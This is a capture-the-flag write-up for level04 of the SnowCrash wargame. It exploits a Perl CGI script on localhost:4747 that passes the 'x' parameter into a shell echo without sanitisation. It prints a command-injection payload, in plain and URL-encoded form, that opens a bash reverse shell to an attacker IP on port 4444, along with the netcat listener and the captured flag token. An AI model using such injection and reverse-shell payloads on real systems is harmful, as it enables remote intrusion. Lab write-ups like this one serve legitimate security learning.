- In `/home/user/level04` we discover a Perl script.
```
level04@SnowCrash:~$ pwd
/home/user/level04
level04@SnowCrash:~$ ls -la
total 16
dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
-r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
-r-x------  1 level04 level04  675 Apr  3  2012 .profile
```

- Examining the `level04.pl` Perl script it is visible that there is a HTTP service running on localhost:4747 which listens for parameter `x` which is extracted and passed through to an `echo` system call

```
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

- We test this with a curl command
```
level04@SnowCrash:~$ curl http://localhost:4747/?x=Hello
Hello
```

- Due to insufficient input sanitation there is opportunity to carry out Remote Code Execution. We intercept the request in BurpSuite and attempt to chain a reverse shell command to connect back to our attack machine using payload `/bin/sh -i >& /dev/tcp/<attackIp>/<attackPort> 0>&1

- Full payload without URL encoding `hello && /bin/bash -c '/bin/sh -i >& /dev/tcp/10.13.200.129/4444 0>&1`

- Payload with URL encoding `hello+%26%26+/bin/bash+-c+'/bin/sh+-i+>%26+/dev/tcp/10.13.200.129/4444+0>%261' `

- Prepare the BurpSuite request with the encoded payload in the GET header

![[Pasted image 20250914000214.png]]


- Start a listener on port 4444 on the attack machine and send the request in BurpSuite to successfully establish a reverse shell as the user `flag04`

```
┌──(kali㉿kali)-[~/Desktop/snowcrash]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.13.200.129] from (UNKNOWN) [10.13.200.131] 42311
/bin/sh: 0: can't access tty; job control turned off
$ whoami
flag04
```

- Retrieve the flag with `getflag` command
```
$ whoami
flag04
$ getflag
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

```

- Authenticate as user `level05` using the acquired token
```
level04@SnowCrash:~$ su level05
Password: 
level05@SnowCrash:~$ 
```




